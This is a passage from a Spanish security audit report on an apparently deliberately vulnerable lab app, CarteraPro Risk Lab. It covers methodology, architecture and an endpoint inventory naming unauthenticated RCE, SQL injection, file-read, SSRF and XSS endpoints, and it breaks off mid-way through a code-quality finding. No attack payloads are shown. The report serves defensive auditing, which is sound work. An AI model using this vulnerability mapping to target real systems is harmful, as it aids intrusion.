# INFORME TÉCNICO DE AUDITORÍA DE SEGURIDAD
## CarteraPro Risk Lab — Parte 1: Secciones 1 a 5

---

| Campo               | Detalle                                                        |
|---------------------|----------------------------------------------------------------|
| **Documento**       | Informe Técnico de Auditoría de Seguridad — Parte 1           |
| **Aplicación**      | CarteraPro Risk Lab                                            |
| **Versión revisada**| 1.0 (entorno de laboratorio)                                   |
| **Fecha de emisión**| 2026-06-13                                                     |
| **Clasificación**   | CONFIDENCIAL — Uso interno restringido                         |
| **Equipo auditor**  | Equipo de Auditoría Técnica — Tendencias en Ingeniería de Software |

---

> **Aviso de confidencialidad:** Este documento contiene información sensible sobre vulnerabilidades de seguridad identificadas en la aplicación CarteraPro Risk Lab. Su distribución debe limitarse estrictamente al personal autorizado. La divulgación no autorizada puede comprometer la seguridad de la organización.

---

## TABLA DE CONTENIDOS

1. [Introducción](#1-introducción)
2. [Metodología](#2-metodología)
3. [Arquitectura Identificada](#3-arquitectura-identificada)
4. [Hallazgos de Calidad de Software](#4-hallazgos-de-calidad-de-software)
5. [Hallazgos de Seguridad](#5-hallazgos-de-seguridad)

---

---

# 1. INTRODUCCIÓN

## 1.1 Objetivo de la Auditoría

El presente informe documenta los resultados del trabajo de auditoría técnica de seguridad realizado sobre la aplicación **CarteraPro Risk Lab**. El objetivo principal de este compromiso fue identificar, clasificar y valorar vulnerabilidades de seguridad y deficiencias de calidad de software presentes en el sistema, con el propósito de proporcionar a la organización contratante una visión completa del estado actual de riesgo de la aplicación y las acciones correctivas necesarias.

Los objetivos específicos de la auditoría fueron los siguientes:

- **Identificar vulnerabilidades de seguridad** que puedan ser explotadas por actores maliciosos internos o externos, clasificándolas según el estándar OWASP Top 10 2021.
- **Evaluar la calidad del código fuente** mediante análisis estático y revisión manual, detectando deuda técnica, malas prácticas y patrones de código problemáticos.
- **Analizar la cadena de dependencias** de terceros, detectando componentes obsoletos o con vulnerabilidades conocidas (CVEs).
- **Valorar el impacto de negocio** de cada hallazgo, priorizando aquellos que representan mayor riesgo para la organización.
- **Proporcionar recomendaciones técnicas concretas** y priorizadas para la remediación de todos los hallazgos identificados.

## 1.2 Contexto

La organización contratante solicitó al **Equipo de Auditoría Técnica — Tendencias en Ingeniería de Software** la realización de una auditoría de seguridad completa sobre la aplicación **CarteraPro Risk Lab**, un sistema de gestión de cartera de clientes y riesgo financiero. La aplicación es utilizada internamente para la gestión de clientes, emisión y seguimiento de facturas, y administración de deudas. Dado el carácter financiero y la sensibilidad de los datos que maneja —incluyendo información personal de clientes, datos de facturación y registros de deuda— la organización determinó que era prioritario someter el sistema a una revisión de seguridad exhaustiva antes de considerar su despliegue en un entorno de producción.

La aplicación fue entregada al equipo auditor en su estado actual de desarrollo, incluyendo acceso completo al código fuente, archivos de configuración e instrucciones de despliegue. El análisis fue realizado íntegramente en un entorno de laboratorio controlado y aislado, sin afectar ningún sistema productivo.

## 1.3 Alcance del Análisis

El alcance de la presente auditoría comprende los siguientes componentes y dimensiones:

| Componente                  | Tecnología                     | Incluido en alcance |
|-----------------------------|--------------------------------|---------------------|
| Backend (servidor API)      | Node.js + Express 4.17.1       | ✅ Sí               |
| Frontend (aplicación web)   | React 18.2 + Vite 5.0          | ✅ Sí               |
| Base de datos               | SQLite (archivo local)         | ✅ Sí               |
| Configuración de entorno    | Docker, .env, docker-compose   | ✅ Sí               |
| Dependencias de terceros    | npm (backend y frontend)       | ✅ Sí               |
| Infraestructura de red      | Red local de laboratorio       | ⚠️ Parcial          |
| Entorno de producción       | No disponible                  | ❌ No               |

**Dimensiones analizadas:**
- Seguridad de la aplicación (OWASP Top 10 2021)
- Calidad y mantenibilidad del código fuente (reglas SonarQube)
- Seguridad de dependencias (npm audit + CVEs conocidos)
- Configuración de seguridad (headers HTTP, CORS, cookies, Docker)
- Autenticación y autorización
- Gestión de secretos y credenciales

**Fuera de alcance:**
- Pruebas de penetración a nivel de red o infraestructura física
- Análisis de seguridad de los servidores del proveedor cloud
- Revisión de procedimientos organizacionales o políticas internas

## 1.4 Información del Compromiso

| Campo                   | Detalle                                                         |
|-------------------------|-----------------------------------------------------------------|
| **Fecha de inicio**     | 2026-06-10                                                      |
| **Fecha de finalización**| 2026-06-13                                                     |
| **Fecha del informe**   | 2026-06-13                                                      |
| **Modalidad**           | Análisis de caja blanca (white-box) con acceso a código fuente  |
| **Entorno**             | Laboratorio local aislado (localhost)                           |
| **Equipo auditor**      | Equipo de Auditoría Técnica — Tendencias en Ingeniería de Software |

## 1.5 Resumen Ejecutivo de Resultados

La auditoría identificó un total de **38 hallazgos** distribuidos en las siguientes categorías de severidad:

| Severidad   | Calidad | Seguridad | Total |
|-------------|---------|-----------|-------|
| 🔴 Crítica  | 0       | 14        | **14** |
| 🟠 Alta     | 5       | 8         | **13** |
| 🟡 Media    | 4       | 6         | **10** |
| 🟢 Baja     | 1       | 0         | **1** |
| **Total**   | **10**  | **28**    | **38** |

> **Conclusión preliminar:** La aplicación presenta un perfil de riesgo **CRÍTICO**. Se identificaron 14 vulnerabilidades de severidad crítica, incluyendo múltiples vectores de inyección SQL, ejecución remota de código (RCE), autenticación completamente rota y exposición total de secretos de configuración. La aplicación **no debe ser desplegada en producción** en su estado actual.

---

---

# 2. METODOLOGÍA

## 2.1 Marco de Referencia

La auditoría fue conducida siguiendo los lineamientos de los siguientes marcos y estándares reconocidos internacionalmente:

- **OWASP Testing Guide v4.2** — Guía de pruebas de seguridad para aplicaciones web
- **OWASP Top 10 2021** — Clasificación de los riesgos más críticos en aplicaciones web
- **OWASP ASVS (Application Security Verification Standard) v4.0** — Para verificación de controles
- **CWE (Common Weakness Enumeration)** — Para clasificación técnica de debilidades
- **CVSS v3.1** — Para puntuación de severidad de vulnerabilidades

## 2.2 Herramientas Utilizadas

### 2.2.1 SonarQube — Análisis Estático (SAST)

**SonarQube** fue utilizado como herramienta principal de análisis estático de código (Static Application Security Testing). Se configuró un proyecto local apuntando a los directorios `backend/` y `frontend/src/` de la aplicación.

| Parámetro            | Configuración                                   |
|----------------------|-------------------------------------------------|
| Versión              | SonarQube Community Edition (última estable)    |
| Perfil de calidad    | Sonar way (JavaScript/TypeScript)               |
| Directorio analizado | `backend/src/`, `frontend/src/`                 |
| Reglas activadas     | Conjunto estándar + reglas de seguridad OWASP   |
| Archivo de config    | `sonar-project.properties` (raíz del proyecto)  |

SonarQube permitió identificar automáticamente patrones como: código duplicado, complejidad ciclomática excesiva, código muerto, excepciones silenciadas, uso de funciones inseguras (`eval`, `exec`), y vulnerabilidades de inyección.

### 2.2.2 OWASP ZAP — Análisis Dinámico (DAST)

**OWASP ZAP (Zed Attack Proxy)** fue utilizado para el análisis dinámico de la aplicación en ejecución (Dynamic Application Security Testing). La herramienta fue configurada como proxy interceptor del tráfico HTTP entre el navegador y la aplicación.

| Parámetro                | Configuración                                    |
|--------------------------|--------------------------------------------------|
| Versión                  | OWASP ZAP 2.15.x                                 |
| Objetivo                 | `http://localhost:5173` (frontend)               |
| Objetivo directo backend | `http://localhost:4000` (API)                    |
| Modo de escaneo          | Active Scan + Spider (con autenticación)         |
| Contexto de autenticación| Formulario de login `/api/auth/login`            |
| Política de escaneo      | Default Attack Policy                            |

Se realizaron los siguientes tipos de pruebas con ZAP:
- Spider/Crawling del frontend para descubrir endpoints
- Active Scan para detección automática de SQLi, XSS, Path Traversal, etc.
- Interceptación manual de peticiones para pruebas específicas
- Fuzzing de parámetros en endpoints identificados

### 2.2.3 npm audit — Análisis de Dependencias

Se ejecutó `npm audit` de forma independiente en los directorios `backend/` y `frontend/` para identificar dependencias con vulnerabilidades conocidas registradas en el NVD (National Vulnerability Database).

```bash
# Backend
cd backend && npm audit --json

# Frontend
cd frontend && npm audit --json
```

Adicionalmente, se realizó un análisis manual de las versiones de dependencias declaradas en los archivos `package.json`, comparando contra las versiones más recientes y sus advisories de seguridad.

### 2.2.4 Revisión Manual de Código Fuente

Se realizó una inspección línea por línea de los archivos críticos del sistema, con especial énfasis en:

- Controladores de rutas (`controllers/`)
- Middleware de autenticación y autorización (`middleware/auth.js`)
- Inicialización de base de datos (`db/init.js`, `db/database.js`)
- Utilidades del frontend (`frontend/src/utils/`)
- Archivos de configuración (`.env`, `docker-compose.yml`, `sonar-project.properties`)
- Componentes React con renderizado de datos (`src/pages/`)

### 2.2.5 Inspección de Tráfico HTTP (DevTools)

Se utilizaron las **Chrome/Firefox DevTools** (panel Network) para:
- Inspeccionar las peticiones y respuestas HTTP en tiempo real
- Analizar los headers HTTP de respuesta (seguridad, información expuesta)
- Verificar el comportamiento de las cookies de sesión
- Validar el contenido de respuestas JSON (datos sensibles expuestos)
- Confirmar hallazgos identificados por otras herramientas

## 2.3 Procedimiento Seguido

La auditoría se estructuró en **7 fases** secuenciales:

### Fase 1 — Reconocimiento (Día 1)

Se realizó la lectura exhaustiva del `README.md`, análisis de la estructura de directorios del proyecto, identificación de tecnologías utilizadas (stack frontend/backend, dependencias, sistema de base de datos) y revisión de la documentación disponible. Esta fase permitió entender el propósito de la aplicación, sus componentes principales y definir el plan de pruebas.

**Actividades:**
- Lectura del `README.md` y documentación del proyecto
- Inventario de archivos y estructura de directorios (`tree`)
- Identificación del stack tecnológico y versiones
- Revisión de archivos de configuración (`package.json`, `docker-compose.yml`, `.env`)
- Identificación de endpoints declarados en las rutas

### Fase 2 — Análisis Exploratorio (Día 1)

Se procedió a la instalación de dependencias y levantamiento del entorno de laboratorio local. Una vez en ejecución, se realizó un mapeo manual de todas las funcionalidades de la aplicación, navegando el frontend e identificando las interacciones con el backend.

**Actividades:**
- Instalación: `npm install` en `backend/` y `frontend/`
- Levantamiento: `npm run dev` (frontend) y `node src/app.js` (backend)
- Mapeo de funcionalidades: login, gestión de clientes, facturas, panel de administración
- Identificación de parámetros y entradas de usuario
- Configuración de OWASP ZAP como proxy de intercepción

### Fase 3 — Análisis Estático (Días 1–2)

Se ejecutó SonarQube sobre el código fuente completo y se complementó con revisión manual línea por línea de los archivos más críticos. Se documentaron todos los hallazgos de calidad y seguridad detectados.

**Actividades:**
- Configuración y ejecución de SonarQube
- Revisión de los reportes de SonarQube: bugs, code smells, vulnerabilidades, duplicaciones
- Inspección manual de `authController.js`, `adminController.js`, `clientController.js`
- Inspección manual de `middleware/auth.js`, `db/init.js`, `legacyDebtController.js`
- Inspección de `frontend/src/utils/sonarDebt.js` y componentes React

### Fase 4 — Análisis Dinámico (Día 2)

Se ejecutó OWASP ZAP en modo activo contra la aplicación en ejecución. Adicionalmente, se realizaron pruebas manuales para validar y reproducir los hallazgos identificados en la fase estática.

**Actividades:**
- Ejecución de ZAP Spider contra `http://localhost:5173`
- Ejecución de ZAP Active Scan con contexto de autenticación configurado
- Pruebas manuales de inyección SQL (login, búsqueda, parámetros)
- Pruebas manuales de RCE (`/api/admin/lab/cmd`, `/api/admin/lab/eval`)
- Pruebas de Path Traversal, SSRF, Open Redirect
- Verificación de tokens falsificados en endpoints protegidos
- Pruebas de XSS almacenado y reflejado

### Fase 5 — Análisis de Dependencias (Día 2)

Se ejecutó `npm audit` en `backend/` y `frontend/` y se analizaron los resultados. Se correlacionaron las versiones declaradas en `package.json` con CVEs conocidos en bases de datos públicas.

**Actividades:**
- `npm audit` en backend y frontend
- Análisis manual de `package.json` (backend y frontend)
- Consulta de CVEs en NVD, Snyk y GitHub Advisory Database
- Identificación de versiones obsoletas con vulnerabilidades conocidas

### Fase 6 — Correlación y Validación de Hallazgos (Día 3)

Se correlacionaron todos los hallazgos identificados por las diferentes herramientas, eliminando duplicados y consolidando la evidencia. Se reprodujeron manualmente todos los hallazgos de seguridad críticos para confirmar su explotabilidad.

**Actividades:**
- Consolidación de hallazgos de SonarQube, ZAP, npm audit y revisión manual
- Reproducción manual de cada vulnerabilidad crítica
- Asignación de identificadores únicos (CAL-XXX, SEC-XXX)
- Clasificación según OWASP Top 10 2021 y CWE

### Fase 7 — Valoración de Riesgos y Elaboración del Informe (Día 3)

Se calculó la severidad de cada hallazgo utilizando CVSS v3.1 como referencia, se determinó el impacto técnico y de negocio, y se redactó el presente informe con recomendaciones de remediación priorizadas.

## 2.4 Alcance Técnico Detallado

| Capa                    | Elementos analizados                                                  |
|-------------------------|-----------------------------------------------------------------------|
| **Backend**             | Node.js/Express, todos los controladores, middleware, rutas, BD       |
| **Frontend**            | Componentes React, utilidades, llamadas API, renderizado HTML         |
| **Base de datos**       | Esquema SQLite, scripts de inicialización, consultas SQL              |
| **Configuración**       | Docker Compose, variables de entorno, archivos `.env`, CORS, headers |
| **Dependencias**        | `package.json` backend y frontend, CVEs conocidos                    |

## 2.5 Limitaciones del Análisis

Las siguientes limitaciones aplican al presente trabajo de auditoría:

1. **Entorno de laboratorio local:** Todo el análisis fue realizado en un entorno local de desarrollo (`localhost`). No se tuvo acceso al entorno de producción real, por lo que podrían existir configuraciones adicionales no evaluadas.
2. **Sin pruebas de carga:** No se realizaron pruebas de denegación de servicio (DoS) ni de rendimiento bajo carga, más allá de las pruebas de ReDoS documentadas.
3. **Sin ingeniería social:** El alcance de la auditoría se limitó a la aplicación técnica; no se evaluaron vectores de ataque social o phishing.
4. **Dependencias transitivas:** El análisis de dependencias se concentró en las dependencias directas; el análisis de dependencias transitivas fue parcial.
5. **Contexto de usuario único:** Las pruebas de control de acceso fueron realizadas con un conjunto limitado de perfiles de usuario (admin, usuario estándar).

---

---

# 3. ARQUITECTURA IDENTIFICADA

## 3.1 Visión General de la Arquitectura

CarteraPro Risk Lab implementa una arquitectura **cliente-servidor de tres capas** basada completamente en el ecosistema JavaScript/Node.js. La aplicación separa la presentación (React SPA), la lógica de negocio (Express API REST) y la persistencia de datos (SQLite).

```mermaid
flowchart TD
    U([Usuario / Navegador])
    FE["Frontend\nReact 18 + Vite 5\npuerto 5173"]
    PROXY["Vite Dev Proxy\n/api/* → :4000"]
    BE["Backend\nNode.js + Express 4\npuerto 4000"]
    MW["Middleware\nweakAuth · CORS · Body-parser"]
    ROUTES["Rutas Express\nauth · clients · invoices\nadmin · uploads · legacy"]
    CTRL["Controladores\nauthCtrl · clientCtrl · invoiceCtrl\nadminCtrl · uploadCtrl · legacyDebtCtrl"]
    DB["Base de Datos\nSQLite3\ncartera.sqlite"]
    FS["Sistema de Archivos\nuploads/"]

    U -->|"HTTP requests"| FE
    FE -->|"/api/* requests"| PROXY
    PROXY -->|"Proxy forward"| BE
    BE --> MW
    MW --> ROUTES
    ROUTES --> CTRL
    CTRL -->|"SQL queries"| DB
    CTRL -->|"File I/O"| FS
```

## 3.2 Componentes Principales

### 3.2.1 Frontend — React 18 + Vite 5

| Característica     | Detalle                                      |
|--------------------|----------------------------------------------|
| Framework          | React 18.2.0                                 |
| Build tool         | Vite 5.0.x                                   |
| Puerto             | 5173 (desarrollo)                            |
| Routing            | React Router DOM                             |
| UI Framework       | Bootstrap 5.3.3                              |
| Cliente HTTP       | Axios 0.21.1                                 |
| Proxy de API       | Vite proxy: `/api/*` → `http://localhost:4000` |

El frontend es una **Single Page Application (SPA)** que consume la API REST del backend a través del proxy de Vite. La autenticación se gestiona mediante un token almacenado en `localStorage`.

### 3.2.2 Backend — Node.js + Express 4

| Característica     | Detalle                                      |
|--------------------|----------------------------------------------|
| Runtime            | Node.js (versión LTS recomendada)            |
| Framework          | Express 4.17.1                               |
| Puerto             | 4000                                         |
| ORM / BD           | sqlite3 (driver directo, sin ORM)            |
| Autenticación      | Token casero (no JWT real)                   |
| Procesamiento body | body-parser, express.json()                  |
| CORS               | cors (configuración permisiva)               |
| Subida de archivos | Multer                                       |

### 3.2.3 Base de Datos — SQLite

| Característica     | Detalle                                      |
|--------------------|----------------------------------------------|
| Motor              | SQLite3                                      |
| Archivo            | `cartera.sqlite` (ruta local relativa)       |
| Tablas principales | `users`, `clients`, `invoices`               |
| Inicialización     | `db/init.js` (script de seed con datos demo) |
| Contraseñas        | Almacenadas en **texto plano**               |

### 3.2.4 Configuración Docker

El proyecto incluye un archivo `docker-compose.yml` para facilitar el despliegue. Se identificaron credenciales y secretos hardcodeados en dicho archivo.

## 3.3 Tecnologías Identificadas

### Backend — Dependencias (`backend/package.json`)

| Paquete             | Versión     | Notas                                          |
|---------------------|-------------|------------------------------------------------|
| express             | 4.17.1      | Versión antigua, múltiples CVEs conocidos      |
| sqlite3             | *           | Driver SQLite para Node.js                     |
| jsonwebtoken        | 8.5.1       | Presente pero NO se usa correctamente          |
| multer              | *           | Subida de archivos, sin validación             |
| axios               | *           | Cliente HTTP (usado para SSRF)                 |
| lodash              | *           | Utilidades; versiones antiguas tienen CVEs     |
| moment              | *           | Manejo de fechas (deprecated)                  |
| body-parser         | *           | Parsing de requests                            |
| dotenv              | *           | Variables de entorno                           |
| cors                | *           | Configurado de forma insegura (`origin: '*'`)  |
| crypto              | built-in    | Módulo nativo Node.js                          |
| child_process       | built-in    | Usado para `exec()` — vector RCE              |
| path / fs           | built-in    | Módulos de sistema de archivos — vector LFI    |

### Frontend — Dependencias (`frontend/package.json`)

| Paquete             | Versión     | Notas                                          |
|---------------------|-------------|------------------------------------------------|
| react               | 18.2.0      | Versión estable                                |
| react-dom           | 18.2.0      | Versión estable                                |
| vite                | 5.0.x       | Build tool y servidor de desarrollo            |
| bootstrap           | 5.3.3       | Framework CSS                                  |
| axios               | 0.21.1      | Versión **muy antigua** con CVEs conocidos     |
| lodash              | 4.17.20     | Versión con posibles vulnerabilidades          |
| moment              | 2.29.1      | Versión con vulnerabilidades (ReDoS en prev.)  |

## 3.4 Flujo General de Información

```mermaid
sequenceDiagram
    actor U as Usuario
    participant FE as Frontend (React :5173)
    participant BE as Backend (Express :4000)
    participant DB as SQLite (cartera.sqlite)

    U->>FE: Navega a la aplicación
    FE->>BE: POST /api/auth/login {username, password}
    BE->>DB: SELECT * FROM users WHERE username='...'
    DB-->>BE: Fila de usuario (con password en plano)
    BE-->>FE: {token, user} (incluye password en respuesta)
    FE->>FE: Guarda token en localStorage

    U->>FE: Consulta lista de clientes
    FE->>BE: GET /api/clients (Authorization: token-1-admin-admin)
    BE->>BE: weakAuth() → next() siempre (sin verificar)
    BE->>DB: SELECT * FROM clients
    DB-->>BE: Lista de clientes
    BE-->>FE: JSON con clientes
    FE->>U: Renderiza con dangerouslySetInnerHTML
```

## 3.5 Estructura de Módulos del Backend

```
backend/
├── src/
│   ├── app.js                    # Punto de entrada, configuración global
│   ├── routes/
│   │   ├── authRoutes.js         # POST /login, GET /users
│   │   ├── clientRoutes.js       # CRUD de clientes
│   │   ├── invoiceRoutes.js      # CRUD de facturas
│   │   ├── adminRoutes.js        # Panel admin + endpoints de lab
│   │   ├── uploadRoutes.js       # Subida de archivos
│   │   └── legacyDebtRoutes.js   # Deuda legacy (ReDoS, crypto, decisión)
│   ├── controllers/
│   │   ├── authController.js     # Login, listado de usuarios
│   │   ├── clientController.js   # Gestión de clientes
│   │   ├── invoiceController.js  # Gestión de facturas
│   │   ├── adminController.js    # Panel admin, RCE, SSRF, LFI, XSS
│   │   ├── uploadController.js   # Manejo de archivos subidos
│   │   └── legacyDebtController.js # Código legacy con múltiples issues
│   ├── middleware/
│   │   └── auth.js               # weakAuth (no autentica), frontendOnlyAdminHint
│   └── db/
│       ├── database.js           # Inicialización conexión SQLite
│       └── init.js               # Creación de tablas y seed de datos
```

## 3.6 Inventario de Endpoints

### Autenticación

| Método | Endpoint            | Descripción                              | Auth requerida |
|--------|---------------------|------------------------------------------|----------------|
| POST   | `/api/auth/login`   | Inicio de sesión                         | No             |
| GET    | `/api/auth/users`   | **Lista todos los usuarios con passwords** | ❌ No         |

### Gestión de Clientes

| Método | Endpoint                  | Descripción                    | Auth requerida |
|--------|---------------------------|--------------------------------|----------------|
| GET    | `/api/clients`            | Listar todos los clientes      | ⚠️ Nominal     |
| POST   | `/api/clients`            | Crear cliente                  | ⚠️ Nominal     |
| GET    | `/api/clients/:id`        | Obtener cliente por ID         | ⚠️ Nominal     |
| GET    | `/api/clients/search`     | Buscar clientes (SQLi)         | ⚠️ Nominal     |
| PUT    | `/api/clients/:id/notes`  | Actualizar notas (XSS)         | ⚠️ Nominal     |

### Gestión de Facturas

| Método | Endpoint                  | Descripción                    | Auth requerida |
|--------|---------------------------|--------------------------------|----------------|
| GET    | `/api/invoices`           | Listar facturas                | ⚠️ Nominal     |
| POST   | `/api/invoices`           | Crear factura                  | ⚠️ Nominal     |
| GET    | `/api/invoices/overdue`   | Facturas vencidas              | ⚠️ Nominal     |
| GET    | `/api/invoices/search`    | Buscar facturas (SQLi)         | ⚠️ Nominal     |

### Panel de Administración

| Método | Endpoint                  | Descripción                        | Auth requerida |
|--------|---------------------------|------------------------------------|----------------|
| GET    | `/api/admin/panel`        | Panel admin (info sensible)        | ❌ No           |
| GET    | `/api/admin/debug`        | **Expone process.env completo**    | ❌ No           |
| GET    | `/api/admin/config`       | Configuración del sistema          | ❌ No           |
| GET    | `/api/admin/lab/cmd`      | **RCE: executa comandos del SO**   | ❌ No           |
| GET    | `/api/admin/lab/eval`     | **RCE: evalúa código JavaScript**  | ❌ No           |
| GET    | `/api/admin/lab/file`     | **LFI: lee archivos del servidor** | ❌ No           |
| GET    | `/api/admin/lab/fetch`    | **SSRF: peticiones arbitrarias**   | ❌ No           |
| GET    | `/api/admin/lab/xss`      | XSS reflejado                      | ❌ No           |
| GET    | `/api/admin/lab/redirect` | Open Redirect                      | ❌ No           |
| GET    | `/api/admin/lab/cookie`   | Cookie insegura                    | ❌ No           |

### Otros Endpoints

| Método | Endpoint                     | Descripción                         | Auth requerida |
|--------|------------------------------|-------------------------------------|----------------|
| POST   | `/api/uploads`               | Subida de archivos (sin restricción)| ⚠️ Nominal     |
| GET    | `/api/uploads`               | Listar archivos subidos             | ⚠️ Nominal     |
| GET    | `/api/legacy/weak-crypto`    | Demo criptografía débil             | ❌ No           |
| GET    | `/api/legacy/regex`          | **ReDoS — cuelga el servidor**      | ❌ No           |
| GET    | `/api/legacy/decision`       | Lógica de decisión compleja         | ❌ No           |

> ⚠️ **Nota:** "Auth nominal" significa que el middleware `weakAuth` está registrado pero **no realiza ninguna verificación real** (ver SEC-006).

## 3.7 Diagrama de Arquitectura Detallado

```mermaid
flowchart TD
    subgraph CLIENT["Capa de Presentación — Cliente"]
        BR["Navegador Web"]
        REACT["React SPA\nReact 18.2 + Bootstrap 5.3.3\n:5173"]
        LS["localStorage\n(token almacenado)"]
    end

    subgraph PROXY_LAYER["Capa de Proxy (Vite Dev)"]
        VP["Vite Proxy\n/api/* → :4000"]
    end

    subgraph BACKEND["Capa de Lógica — Servidor"]
        APP["app.js\nExpress 4.17.1\n:4000"]
        MW_CORS["Middleware CORS\norigin: '*'"]
        MW_AUTH["Middleware Auth\nweakAuth (no verifica)"]
        
        subgraph ROUTES["Rutas"]
            R1["authRoutes"]
            R2["clientRoutes"]
            R3["invoiceRoutes"]
            R4["adminRoutes"]
            R5["uploadRoutes"]
            R6["legacyDebtRoutes"]
        end

        subgraph CONTROLLERS["Controladores"]
            C1["authController\n(SQLi Login)"]
            C2["clientController\n(SQLi Búsqueda)"]
            C3["invoiceController"]
            C4["adminController\n(RCE, SSRF, LFI, XSS)"]
            C5["uploadController\n(sin restricciones)"]
            C6["legacyDebtController\n(ReDoS, crypto débil)"]
        end
    end

    subgraph DATA["Capa de Datos"]
        SQLITE["SQLite3\ncartera.sqlite"]
        FS_UP["Sistema de Archivos\nuploads/"]
        ENV["Variables de Entorno\n.env / process.env"]
    end

    subgraph EXTERNAL["Recursos Externos (SSRF)"]
        EXT["Internet / Red interna\nMetadata AWS, servicios internos"]
    end

    BR --> REACT
    REACT <--> LS
    REACT --> VP
    VP --> APP
    APP --> MW_CORS
    APP --> MW_AUTH
    MW_AUTH --> ROUTES
    R1 --> C1
    R2 --> C2
    R3 --> C3
    R4 --> C4
    R5 --> C5
    R6 --> C6
    C1 --> SQLITE
    C2 --> SQLITE
    C3 --> SQLITE
    C4 --> SQLITE
    C4 --> FS_UP
    C4 --> ENV
    C4 --> EXT
    C5 --> FS_UP
```

---

---

# 4. HALLAZGOS DE CALIDAD DE SOFTWARE

> Los hallazgos de esta sección fueron detectados principalmente mediante análisis estático con **SonarQube** y revisión manual de código fuente. Cada hallazgo incluye evidencia de código real extraída de la aplicación.

---

## CAL-001: Duplicación de Código Exacta

| Campo                      | Detalle                                                    |
|----------------------------|------------------------------------------------------------|
| **Identificador**          | CAL-001                                                    |
| **Nombre**                 | Duplicación de Código Exacta                               |
| **Categoría**              | Calidad de Código — Mantenibilidad                         |
| **Tipo**                   | Code Smell (Duplicación)                                   |
| **Severidad**              | 🟡 Media                                                   |
| **Herramienta detectora**  | SonarQube (regla: `common-java:DuplicatedBlocks`) + Manual |
| **CWE**                    | CWE-1041: Use of Redundant Code                            |

### Descripción Técnica

Se identificaron bloques de código exactamente duplicados en dos archivos distintos del proyecto. La duplicación exacta de lógica viola el principio **DRY (Don't Repeat Yourself)** y representa deuda técnica crítica: cualquier corrección de un bug o modificación de comportamiento debe aplicarse en múltiples lugares, aumentando el riesgo de inconsistencias y errores de mantenimiento.

SonarQube clasificó esta situación como un bloque de **duplicación del 100%** entre las funciones afectadas.

### Evidencia — Archivo 1: `backend/src/controllers/legacyDebtController.js`

Las funciones `duplicatedExportA` y `duplicatedExportB` son **idénticas** línea por línea:

```javascript
// Función 1 — líneas ~98-110
function duplicatedExportA(data) {
  const rows = data.map(item => {
    return `${item.id},${item.name},${item.amount},${item.date}`;
  });
  const header = 'id,name,amount,date';
  const csv = [header, ...rows].join('\n');
  return csv;
}

// Función 2 — líneas ~112-122 (IDÉNTICA a duplicatedExportA)
function duplicatedExportB(data) {
  const rows = data.map(item => {
    return `${item.id},${item.name},${item.amount},${item.date}`;
  });
  const header = 'id,name,amount,date';
  const csv = [header, ...rows].join('\n');
  return csv;
}
```

### Evidencia — Archivo 2: `frontend/src/utils/sonarDebt.js`

Las funciones `duplicateFormatterA` y `duplicateFormatterB` son igualmente **idénticas**:

```javascript
// Función A
export function duplicateFormatterA(value) {
  if (value === null || value === undefined) return 'N/A';
  if (typeof value === 'number') return value.toFixed(2);
  if (typeof value === 'string') return value.trim().toUpperCase();
  return String(value);
}

// Función B (IDÉNTICA a duplicateFormatterA)
export function duplicateFormatterB(value) {
  if (value === null || value === undefined) return 'N/A';
  if (typeof value === 'number') return value.toFixed(2);
  if (typeof value === 'string') return value.trim().toUpperCase();
  return String(value);
}
```

### Reproducibilidad

Verificable directamente en el código fuente. SonarQube reporta el bloque duplicado con un 100% de similitud entre las funciones afectadas.

### Impacto Técnico

- Cualquier bug en la lógica de exportación CSV debe corregirse en **dos lugares** bajo riesgo de inconsistencia.
- Aumenta el tamaño del bundle del frontend innecesariamente.
- SonarQube penaliza la métrica de **duplicación** del proyecto, afectando el Quality Gate.
- Mayor superficie de código a mantener y revisar en futuras auditorías.

### Impacto de Negocio

- Incremento del **costo de mantenimiento** del software a largo plazo.
- Mayor probabilidad de introducir regresiones al corregir únicamente una de las copias.
- Señal de ausencia de cultura de revisión de código (code review) en el equipo.

### Causa Raíz

Ausencia de revisión de código (pull request / code review) antes de integrar cambios. Las funciones probablemente fueron creadas con copiar-pegar sin refactorizar hacia una función común reutilizable.

### Solución Recomendada

Unificar las funciones duplicadas en una sola función reutilizable:

```javascript
// Solución: una única función exportada
function exportToCSV(data) {
  const header = 'id,name,amount,date';
  const rows = data.map(item =>
    `${item.id},${item.name},${item.amount},${item.date}`
  );
  return [header, ...rows].join('\n');
}

// Aliases para compatibilidad si es necesario
const duplicatedExportA = exportToCSV;
const duplicatedExportB = exportToCSV;
```

De igual forma para `frontend/src/utils/sonarDebt.js`, reemplazar `duplicateFormatterA` y `duplicateFormatterB` por una única función `formatValue` exportada.

| Campo                       | Valor     |
|-----------------------------|-----------|
| **Complejidad de Corrección** | Baja    |
| **Prioridad**               | Media     |
| **Esfuerzo estimado**       | < 1 hora  |

---

## CAL-002: Complejidad Ciclomática Excesiva

| Campo                      | Detalle                                                    |
|----------------------------|------------------------------------------------------------|
| **Identificador**          | CAL-002                                                    |
| **Nombre**                 | Complejidad Ciclomática Excesiva                           |
| **Categoría**              | Calidad de Código — Mantenibilidad / Testeabilidad         |
| **Tipo**                   | Code Smell (Complejidad)                                   |
| **Severidad**              | 🟠 Alta                                                    |
| **Herramienta detectora**  | SonarQube (regla: `javascript:S3776`)                      |
| **CWE**                    | CWE-1120: Excessive Code Complexity                        |

### Descripción Técnica

La **complejidad ciclomática** mide el número de caminos linealmente independientes a través del código fuente. SonarQube establece un umbral de alerta en **complejidad > 10** por función. Se identificaron dos funciones que superan ampliamente este umbral:

- `complexBillingDecision` en `legacyDebtController.js`: complejidad ciclomática estimada en **~12**, con 8 niveles de `if` anidados.
- `calculateRiskLabel` en `frontend/src/utils/sonarDebt.js`: complejidad estimada en **~9**, con 6 niveles anidados.

Funciones con alta complejidad ciclomática son difíciles de leer, probar unitariamente (requieren un número exponencial de casos de prueba) y mantener sin introducir regresiones.

### Evidencia — `legacyDebtController.js`: función `complexBillingDecision`

```javascript
function complexBillingDecision(client, invoice, config) {
  // Nivel 1
  if (client) {
    // Nivel 2
    if (client.active) {
      // Nivel 3
      if (invoice) {
        // Nivel 4
        if (invoice.amount > 0) {
          // Nivel 5
          if (config && config.billing) {
            // Nivel 6
            if (config.billing.mode === 'strict') {
              // Nivel 7
              if (invoice.overdue) {
                // Nivel 8
                if (client.creditScore < 500) {
                  return 'BLOCK';
                } else {
                  return 'WARN';
                }
              } else {
                return 'ALLOW';
              }
            } else if (config.billing.mode === 'lenient') {
              return 'ALLOW';
            } else {
              return 'REVIEW';
            }
          } else {
            return 'NO_CONFIG';
          }
        } else {
          return 'ZERO_AMOUNT';
        }
      } else {
        return 'NO_INVOICE';
      }
    } else {
